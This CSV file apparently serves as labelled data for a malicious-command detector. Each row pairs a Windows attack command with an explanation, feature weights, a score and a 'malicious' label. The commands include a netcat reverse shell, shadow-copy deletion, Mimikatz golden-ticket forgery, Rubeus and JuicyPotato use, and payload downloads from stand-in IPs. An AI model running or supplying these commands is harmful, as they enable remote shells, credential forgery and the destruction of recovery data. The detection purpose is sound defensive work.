prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label,,
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt},This command can be used to register a malicious DLL payload on a remote webdav server and execute it on a target machine using ODBC data sources.,odbcconf,\\webdavserver\folder\payload_dll.txt,none,\\webdavserver\folder\payload_dll.txt,none,"/s,/a,regsvr",none,0.65,malicious,,
"powershell $client = New-Object System.Net.Sockets.TCPClient(""10.10.10.10""","This PowerShell command creates a new TCP client object and connects to the specified IP address, potentially allowing an attacker to establish a remote connection to a command and control server.",powershell,System.Net.Sockets.TCPClient,none,none,10.10.10.10,New-Object,none,0.65,malicious,,
"powershell $client = New-Object System.Net.Sockets.TCPClient(""11.10.10.10""","This PowerShell command creates a new TCP client object and connects to the specified IP address, potentially allowing an attacker to establish a remote connection to a command and control server.",powershell,System.Net.Sockets.TCPClient,none,none,11.10.10.10,New-Object,none,0.65,malicious,,
desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.ext /eventName:randomname,"This command can be used to download an image from a specified URL and set it as the lock screen background, potentially as part of a social engineering attack to trick the user into entering their credentials.",desktopimgdownldr ,https://domain.com:8080/file.ext ,none,https://domain.com:8080/file.ext ,domain.com:8080,/lockscreenurl,none,0.65,malicious,,
nc.exe 192.168.100.113 4444 -e cmd.exe,"This command can be used to establish a reverse shell to a remote attacker-controlled machine, allowing the attacker to execute arbitrary commands on the compromised machine.",nc.exe,cmd.exe,none,none,192.168.100.113:4444,-e,none,0.65,malicious,,
nc.exe 193.168.100.113 4444 -e cmd.exe,"This command can be used to establish a reverse shell to a remote attacker-controlled machine, allowing the attacker to execute arbitrary commands on the compromised machine.",nc.exe,cmd.exe,none,none,193.168.100.113:4444,-e,none,0.65,malicious,,
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p,"This command launches a service host process that runs services in the background, and it could potentially be used to hide malicious activity or execute code as a system-level process.",svchost.exe,C:\Windows\System32\svchost.exe,none,C:\Windows\System32\svchost.exe,none,"-k,LocalSystemNetworkRestricted,-p",none,0.65,malicious,,
C:\Windows\System32\cmd.exe /c vssadmin delete shadows /all /quiet,"Potential use: Deleting Volume Shadow Copies to hinder forensic analysis.
What it does: Deletes all Volume Shadow Copies on the system silently.",cmd.exe,shadows,none,C:\Windows\System32\cmd.exe,none,"/c,delete,/all,/quiet",none,0.65,malicious,,
C:\Windows\System32\cmd.exe /c wmic shadowcopy delete,"Potential use: Deleting shadow copies to hinder recovery efforts.
What it does: Executes the Windows Management Instrumentation Command-line (WMIC) tool to delete all shadow copies on the system.",cmd.exe,shadowcopy,none,C:\Windows\System32\cmd.exe,none,"/c,delete",none,0.65,malicious,,
copy C:\Users\Administrator\Downloads\build.xml \\10.10.10.10\C$\Windows\Temp\,"This command can be used to copy a file from the local machine to a remote machine, potentially allowing an attacker to move malicious files onto a target machine for execution.",none,\\10.10.10.10\C$\Windows\Temp\,none,C:\Users\Administrator\Downloads\build.xml,10.10.10.10,copy,none,0.70,malicious,,
copy C:\Windows\Temp\Malice.exe \\10.10.10.10\C$\Windows\Temp,"This command can be used to copy a malicious executable file to a remote machine's temporary folder, allowing for remote execution of the malware.",none,\\10.10.10.10\C$\Windows\Temp,none,C:\Windows\Temp\Malice.exe,10.10.10.10,copy,none,0.70,malicious,,
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,"This command can be used to create a golden ticket for the target domain with the specified user, domain, and SID, using the KRBTGT hash and granting the user ID 500 and group 513 privileges.",none,kerberos::golden,none,targetdomain.com,targetdomain.com,"/sid:S-1-5-21-[DOMAINSID],/krbtgt:[KRBTGTHASH]",none,0.70,malicious,,
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,"This command can be used to create a golden ticket for the Administrator account in the target domain, allowing the attacker to authenticate as that user and access resources in the domain.",none,kerberos::golden,none,targetdomain.com,dc.targetdomain.com,"/sid:S-1-5-21-[DOMAINSID],/rc4:[MACHINEACCOUNTHASH],/service",none,0.70,malicious,,
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for the specified user with delegated privileges, potentially allowing an attacker to move laterally within the target domain using the stolen TGT.",none,/rc4:2892D26CDF84D7A70E2EB3B9F05C425E,none,targetdomain.com,targetdomain.com,asktgt,none,0.70,malicious,,
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:10.10.10.10 /rc4:2892D26CDF84D7A70E2EB3B9F05C425E,"This command can be used to request a Kerberos ticket-granting ticket (TGT) for a specified user with delegation privileges in a specified domain, potentially allowing an attacker to escalate privileges and move laterally within the network.",none,/rc4:2892D26CDF84D7A70E2EB3B9F05C425E,none,10.10.10.10,10.10.10.10,asktgt,none,0.70,malicious,,
kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi,"This command can be used to create a golden ticket attack by forging a Kerberos ticket-granting ticket (TGT) for the target domain using the compromised domain's SID and RC4 hash, allowing the attacker to impersonate any user or service in the target domain.",none,kerberos::golden,none,c:\users\public\ticket.kirbi,currentdomain.targetdomain.com,"/sid,/sids,/rc4,/service,/target,/ticket",none,0.70,malicious,,
kerberos::golden /domain:10.10.10.10 /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi,"This command can be used to create a golden ticket attack by forging a Kerberos ticket-granting ticket (TGT) for the target domain using the hash of the KRBTGT account and the SID of the target domain, allowing the attacker to impersonate any user in the target domain.",none,kerberos::golden,none,c:\users\public\ticket.kirbi,10.10.10.10,"/sid,/sids,/rc4,/service,/target,/ticket",none,0.70,malicious,,
.\JuicyPotato.exe -t * -p c:\path\to\executable.bat -l 9002,This command can be used to exploit a vulnerability in Windows to escalate privileges and execute a malicious executable file with SYSTEM level permissions.,JuicyPotato.exe,c:\path\to\executable.bat,none,.\JuicyPotato.exe,9002,"-t,-p,-l",none,0.70,malicious,,
.\JuicyPotato.exe -t * -p c:\path\to\executable.bat -l 9002 -c '{CLSID}',This command can be used to execute a malicious executable with elevated privileges by exploiting the Windows Component Object Model (COM) and impersonating a privileged user.,JuicyPotato.exe,c:\path\to\executable.bat,none,.\JuicyPotato.exe,9002,"-t,-p,-l,-c",none,0.70,malicious,,
"call bitsDownloader.bat ""https://10.10.10.10/files/PSTools.zip"" pstools.zip",This command can be used to download a file from a remote server using BITS (Background Intelligent Transfer Service) and can be used to download malicious files or tools onto a compromised machine.,none,pstools.zip,none,https://10.10.10.10/files/PSTools.zip,10.10.10.10,"call,bitsDownloader.bat",none,0.70,malicious,,
"call bitsDownloader.bat ""https://11.11.11.11/files/PSTools.zip"" pstools.zip","Potential use in a cyberattack: Downloading and executing malicious files from a remote server using Background Intelligent Transfer Service (BITS) to evade detection.

What it does on a Windows machine: Calls a batch file to download a file from a specified URL using BITS and saves it as ""pstools.zip"".",none,pstools.zip,none,https://11.11.11.11/files/PSTools.zip,11.11.11.11,"call,bitsDownloader.bat",none,0.70,malicious,,
"call winhhtpjs.bat ""https://10.10.10.10/files/some.zip"" -saveTo ""c:\somezip.zip""","This command can be used to download a file from a remote server and save it to a local directory, potentially allowing an attacker to download and execute malicious code on the victim's machine.",none,c:\somezip.zip,none,https://10.10.10.10/files/some.zip,10.10.10.10,"call,winhhtpjs.bat",none,0.70,malicious,,
"call winhhtpjs.bat ""https://11.11.11.11/files/some.zip"" -saveTo ""c:\somezip.zip""","Potential use in a cyberattack: Downloading and saving a malicious file from a remote server to the victim's machine.
What it does on a Windows machine: Executes a batch file to call the Windows HTTP JavaScript file to download a file from a specified URL and save it to a specified location on the local machine.",none,c:\somezip.zip,none,https://11.11.11.11/files/some.zip,11.11.11.11,"call,winhhtpjs.bat",none,0.70,malicious,,
"call XMLHTTPDownloadJS.bat ""https://10.10.10.10/files/PSTools.zip pst2.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, which can be useful for downloading malicious payloads or tools for lateral movement.",none,pstools.zip,none,https://10.10.10.10/files/PSTools.zip,10.10.10.10,"call,XMLHTTPDownloadJS.bat",none,0.70,malicious,,
"call XMLHTTPDownloadJS.bat ""https://11.11.11.11/files/PSTools.zip pst2.zip"" pstools.zip","This command can be used to download a zip file from a remote server and save it on the local machine, potentially for use in a later stage of the attack.",none,pstools.zip,none,https://11.11.11.11/files/PSTools.zip,11.11.11.11,"call,XMLHTTPDownloadJS.bat",none,0.70,malicious,,
"call webclientDownload.bat ""https://10.10.10.10/files/PSTools.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, potentially allowing an attacker to download and execute malicious files on the victim's machine.",none,pstools.zip,none,https://10.10.10.10/files/PSTools.zip,10.10.10.10,"call,webclientDownload.bat",none,0.70,malicious,,
"call webclientDownload.bat ""https://11.11.11.11/files/PSTools.zip"" pstools.zip","This command can be used to download a file from a remote server and save it on the local machine, potentially allowing an attacker to execute malicious code or tools.",none,pstools.zip,none,https://11.11.11.11/files/PSTools.zip,11.11.11.11,"call,webclientDownload.bat",none,0.70,malicious,,
"Rundll32 ..\Kiod.hod2,DllRegisterServer",Adversaries may use rundll32.exe to load malicious DLLs. ,Rundll32,Kiod.hod2,none,..\Kiod.hod2,none,DllRegisterServer,Mitre Attack,0.7,malicious,,
Cmd.exe /c reg add HKCU\<Reg Key Path> /d 1q1a1z.bat /f,Adversaries may use cmd.exe along with /c or /k parameter to launch other Windows utilities for further attack.,Cmd.exe,d 1q1a1z.bat ,none,HKCU\<Reg Key Path>,none,"reg add, /f",Mitre Attack,0.7,malicious,,
Wmic process call create “rundll32.exe C:\ProgramData\lLjlxNACJC.dll CPGenRandom”,Adversaries may use wmic for execution or performing lateral movement in the target network.,"Wmic, rundll32.exe",C:\ProgramData\lLjlxNACJC.dll ,none,C:\ProgramData\lLjlxNACJC.dll ,none,process call create,Mitre Attack,0.7,malicious,,
start ms-appinstaller://?source=https://10.101.10.10/raw/tdyShwLw,"This command can be used to initiate the installation of an application from a remote source, potentially allowing an attacker to install malicious software on the victim's machine.",ms-appinstaller,https://10.101.10.10/raw/tdyShwLw,none,source=https://10.101.10.10/raw/tdyShwLw,10.101.10.10,start,none,0.75,malicious,,
start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw,"This command could be used to initiate the installation of a potentially malicious application from a remote server, which could then be used to gain unauthorized access or steal sensitive information from the compromised machine.",ms-appinstaller,https://11.101.10.10/raw/tdyShwLw,none,source=https://11.101.10.10/raw/tdyShwLw,11.101.10.10,start,none,0.75,malicious,,
